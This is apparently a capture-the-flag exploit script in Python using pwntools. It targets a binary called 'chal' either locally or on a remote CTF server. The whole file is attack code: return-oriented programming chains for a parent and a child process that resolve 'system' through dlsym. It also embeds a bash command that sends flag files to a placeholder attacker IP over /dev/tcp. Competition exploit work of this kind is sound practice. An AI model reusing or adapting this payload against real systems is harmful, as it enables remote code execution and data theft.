#!/usr/bin/env python

import sys
from pwn import *

if len(sys.argv) == 1:
    r = process('./chal')
else:
    r = remote('eof.ais3.org', 19091)

pop_rdi = 0x400cb3
pop_rsi_r15 = 0x400cb1
leave_ret = 0x4008ea
ret = 0x4008eb
call_rax = 0x4006f0
dlsym = 0x400770
pop_csu = 0x400caa
csu = 0x400c90

bss = 0x6020e0
ptr = bss+0x570
parent_ptr = bss+0x380
bss2 = parent_ptr+0x40
ptr2 = bss2+0x50

# parent process ROP
parent = 'B'*0x30
parent += p64(bss2) + p64(leave_ret)
parent += p64(bss2) + p64(pop_rdi) + p64(0)
parent += p64(pop_rsi_r15) + p64(ptr2) + p64(0)
parent += p64(dlsym)
parent += p64(pop_rdi) + p64(ptr2+7)
parent += p64(call_rax)
parent += 'system\x00/bin/bash -c "cat /home/*/flag > /dev/tcp/======IP======/20001"\x00\x00'
parent += '\x00'*8

# child process ROP
payload = 'A'*0x30
payload += p64(bss+0x460) + p64(leave_ret)
payload += p64(bss)*104
payload += parent
payload += p64(bss) + p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(ptr) + p64(0)
payload += p64(dlsym)
payload += p64(pop_csu)
payload += p64(0) + p64(1) + p64(ptr+0x10) + p64(1) + p64(parent_ptr) + p64(len(parent))
payload += p64(csu) + p64(0) + p64(0) + p64(bss) + p64(0)*4
payload += p64(call_rax) + p64(0) + p64(ret)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(ptr+6) + p64(0)
payload += p64(dlsym)
payload += p64(pop_rdi) + p64(222)
payload += p64(call_rax)
payload += 'write\x00_exit\x00\x00\x00\x00\x00' + p64(ret)
r.sendline(payload)

r.interactive()
